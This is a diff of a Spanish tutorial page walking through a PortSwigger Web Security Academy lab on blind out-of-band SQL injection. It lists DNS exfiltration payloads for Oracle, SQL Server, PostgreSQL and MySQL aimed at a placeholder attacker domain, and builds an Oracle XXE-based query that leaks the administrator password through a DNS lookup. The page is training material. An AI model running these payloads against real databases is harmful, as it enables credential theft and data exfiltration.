@@ -9,60 +9,81 @@ grand_parent: 4. Inyecciones ciegas
 
 # Ejercicio práctico de inyección fuera de banda
 
-## Consigna
-La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie presentada. La misma es vulnerable a Inyecciones SQL, sin embargo las consultas se ejecutan de forma asincrónica y no tienen ningún efecto en la respuesta de la aplicación. Por lo que, debemos probar extraer la información mediante otro canal.
+> Ejercicio basado en el laboratorio "Lab: Blind SQL injection with out-of-band data exfiltration" de Web Security Academy (PortSwigger).
 
-Nuevamente nos mencionan que la base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`, y para resolver el laboratorio, es necesario  iniciar sesión como `administrator`.
+## Consigna
+
+Este laboratorio contiene una vulnerabilidad de inyección de SQL ciega. La aplicación usa una cookie de rastreo (*tracking*) para análisis y ejecuta una consulta SQL con el valor de esta cookie. 
+
+Sin embargo, las consultas se ejecutan de forma asincrónica y no tienen ningún efecto en la respuesta de la aplicación. Por lo que, se debe probar extraer la información mediante otro canal.
+
+La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`.
+
+Para resolver el laboratorio, obtener el usuario y contraseña del usuario `administrator` e iniciar sesión con estas credenciales.
 
 ## Resolución con Burp Collaborator
 
-Para la resolución de este laboratorio se utilizara el servidor de burp collaborator el cual esta publicado a internet y puede funcionar como canal para recibir la información. Y nos apoyaremos en la [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) para la construcción de la consulta.
+Para la resolución de este laboratorio se utilizará el servidor de **Burp Collaborator** el cual está publicado a Internet y puede funcionar como canal para recibir la información. Si bien existen herramientas alternativas gratuitas, el laboratorio está configurado para únicamente comunicarse con dominios asociados a PortSwigger.
 
-La premisa del laboratorio nos menciona que no es posible observar cambios de comportamiento sobre la aplicación, por lo que todas nuestras pruebas deben apoyarse directamente en nuestro servidor tercero. Para ello debemos  ir a la seccion `Collaborator` (Solo disponible para Burpsuite Professional).
+La consigna menciona que no es posible observar cambios de comportamiento sobre la aplicación, por lo que todas las pruebas deben apoyarse directamente en el servidor auxiliar externo. Para ello, acceder a la pestaña `Collaborator` (solo disponible para *Burp Suite Professional*).
 
 ![Collaborator](/test-page/assets/oob_ex_1.png)
 
-Solo debemos presionar `Copy to clipboard` y automáticamente obtendremos un subdominio único el cual podremos usar como canal para visualizar las respuestas del servidor. 
+Al presionar `Copy to clipboard` automáticamente se obtiene un **subdominio único** el cual se puede usar como canal para visualizar las respuestas DNS y HTTP del servidor de *Collaborator*.
 
-Podemos probar los diferentes métodos mencionados en la cheat sheet para forzar una consulta DNS lookup e identificar el tipo de base de datos.
+Para identificar el DBMS y qué *payload* es válido, es pertinente probar los diferentes métodos mencionados en la [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) y así forzar una consulta DNS:
 
-	ORACLE:
-	La siguiente técnica aprovecha una vulnerabilidad de entidad externa XML ([XXE](https://portswigger.net/web-security/xxe)) para activar una búsqueda DNS. La vulnerabilidad ha sido parcheada, pero existen muchas instalaciones de Oracle sin parchear:  
-	`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`  
-  
-	La siguiente técnica funciona en instalaciones Oracle totalmente parcheadas, pero requiere privilegios elevados:  
-	`SELECT UTL_INADDR.get_host_address('dominio-atacante.net')`
+- **Oracle**: 
+	```sql
+	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://dominio-atacante.net/">
+	 %remote;]>'),'/l') FROM dual
+	```
+	```sql
+	SELECT UTL_INADDR.get_host_address('dominio-atacante.net')
+	```
+- **Microsoft**:
+	```sql
+	exec master..xp_dirtree '//dominio-atacante.net'`
+	```
+- **PostgreSQL**:
+	```sql
+	COPY (SELECT '') TO program 'nslookup dominio-atacante.net'`
+	```
+- **MySQL**:
+	```sql
+	LOAD_FILE('\\\\dominio-atacante.net\a')`  
+	```
+	```sql
+	SELECT ... INTO OUTFILE '\\\\dominio-atacante.net\a'`
+	```
 
-	MICROSOFT:
-	`exec master..xp_dirtree '//dominio-atacante.net'`
-
-	PostgreSQL:
-	`copy (SELECT '') to program 'nslookup dominio-atacante.net'`
-
-	MySQL:
-	Las siguientes técnicas sólo funcionan en Windows:  
-	`LOAD_FILE('\\\\dominio-atacante.net\a')`  
-	`SELECT ... INTO OUTFILE '\\\\dominio-atacante.net\a'`
-
-Una consulta exitosa generaría una resolución DNS sobre el dominio utilizado, esto sería visualizado de la siguiente manera en la sección `Collaborator`
+Una consulta exitosa generaría una resolución DNS sobre el dominio utilizado, esto sería visualizado de la siguiente manera en la sección `Collaborator`:
 
 ![Collaborator 2](/test-page/assets/oob_ex_2.png)
 
-Bien, identificamos el tipo de base, sumado a los datos facilitados en la consigna, solo nos restaría construir la consulta mediante la cual vamos a extraer la información que requerimos, volvamos a la **sheat sheet**.
-  
-La siguiente técnica aprovecha una entidad externa XML ([XXE](https://portswigger.net/web-security/xxe)) para activar una búsqueda de DNS.
+La exitosa es la de Oracle con XML. Habiendo identificado el DBMS, sumado a los datos facilitados en la consigna, solo resta construir la consulta mediante la cual se extraerá la información. La técnica exitosa aprovecha una entidad externa XML (XXE) para activar una búsqueda de DNS. No está dentro del alcance de esta documentación explicar por qué funciona (se recomienda ver el [módulo XXE de la Web Security Academy](https://portswigger.net/web-security/xxe)). Lo importante es entender la posición de inyección y que la URL del *payload* debe ser reemplazada por la que provee *Burp Collaborator*. Con el siguiente fragmento simplificado de inyección:
 
-`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.dominio-atacante.net/"> %remote;]>'),'/l') FROM dual
-`
+```sql
+SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [ <!ENTITY % remote SYSTEM 
+	"http://'||(SELECT YOUR-QUERY-HERE)||'.dominio-atacante.net/"> 
+	%remote;]>'),'/l') FROM dual
+```
 
-Con nuestra consulta SQL quedaría de la siguiente forma:
+**se inserta como subdominio** el resultado de una consulta arbitraria. Por ejemplo, si la consulta fuera `SELECT 'jeje'`, el DBMS intentaría resolver el subdominio `jeje.dominio-atacante.net`. Por lo tanto, para obtener la contraseña del administrador, se inserta `SELECT password FROM users WHERE username='administrator'`. Finalmente, consulta final es:
 
-`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.dominio-atacante.net/"> %remote;]>'),'/l') FROM dual`
+```sql
+SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [ <!ENTITY % remote SYSTEM 
+	"http://'||(SELECT password FROM users WHERE username='administrator')
+	||'.dominio-atacante.net/"> %remote;]>'),'/l') FROM dual
+```
 
-Tal como está construida la consulta, lo que esperaríamos es una resolución DNS cuyo dominio consultado contendrá la respuesta de la consulta SQL continuado por el dominio atacante, algo similar a: `password.dominio-atacante.net`.
+Suplantar el valor de la cookie con el payload final de inyección resulta en el siguiente pedido HTTP:
 
-Observemos la respuesta en el `Collaborator`
+![Repeater](/test-page/assets/oob_ex_3.jpg)
 
-![Collaborator 3](/test-page/assets/oob_ex_3.png)
+Notar que se utiliza un dominio de *Burp Collaborator* (`oastify.com`), y que los caracteres `%` y `;` fueron reemplazados por `%25` y `%3b` respectivamente. Estas son sus codificaciones para URL y son necesarias para no generar conflicto con la interpretación/*parsing* de la cookie. Observando la respuesta en el historial de la pestaña `Collaborator`:
 
-[DNS Based Out of Band Blind SQL injection in Oracle — Dumping data](https://usamaazad.medium.com/dns-based-out-of-band-blind-sql-injection-in-oracle-dumping-data-45f506296945)
+![Collaborator 3](/test-page/assets/oob_ex_4.png)
+
+se aprecia la contraseña de la consulta inyectada como subdominio en la solicitud DNS.
